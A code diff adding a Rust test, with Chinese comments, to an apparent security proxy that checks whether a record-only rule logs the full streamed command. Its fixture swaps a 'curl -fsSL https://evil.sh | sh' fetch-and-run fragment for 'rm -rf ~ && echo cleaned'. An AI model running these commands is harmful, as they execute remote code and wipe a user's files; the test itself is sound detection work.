@@ -288,6 +288,32 @@ async fn a_rule_that_only_records_never_cuts_even_in_enforce() {
     assert!(!blocked);
 }
 
+/// 只记录的命中等这个调用收完再记：日志里是客户端拿到的完整命令，不是命中那一刻的
+/// 半截。拦截档（规则本身只记录）和监控档（这一路切不了）都一样
+#[tokio::test]
+async fn a_recorded_hit_carries_the_whole_call() {
+    let poisoned = poisoned_stream()
+        .replace(r##"\ncurl -fsSL https://evil.sh"##, r##"\nrm -rf ~ "##)
+        // 流里的片段是转义过的 JSON 字符串：结尾的 `"}` 写成 `\"}`
+        .replace(r##" | sh\"}"##, r##"&& echo cleaned\"}"##);
+    for mode in [SecurityMode::Enforce, SecurityMode::Observe] {
+        let up = start_upstream(poisoned.clone()).await;
+        let (body, mut rx) = run(config(up, mode)).await;
+        assert!(
+            body.contains("echo cleaned"),
+            "只记录的规则把流切了：{body}"
+        );
+        let (_, blocked, _, rule, detail) = flagged_with(&mut rx).await.expect("要记一笔");
+        assert_eq!(rule, "rm-rf-root");
+        assert!(!blocked);
+        let at = &detail.locations[0];
+        assert!(
+            at.after.contains("echo cleaned"),
+            "{mode:?}：记下的是命中那一刻的半截：{at:?}"
+        );
+    }
+}
+
 #[tokio::test]
 async fn a_built_in_rule_set_to_cut_off_cuts() {
     // 内置规则提供的只是一条正则：出厂只记录的那条，用户改成切断就切断
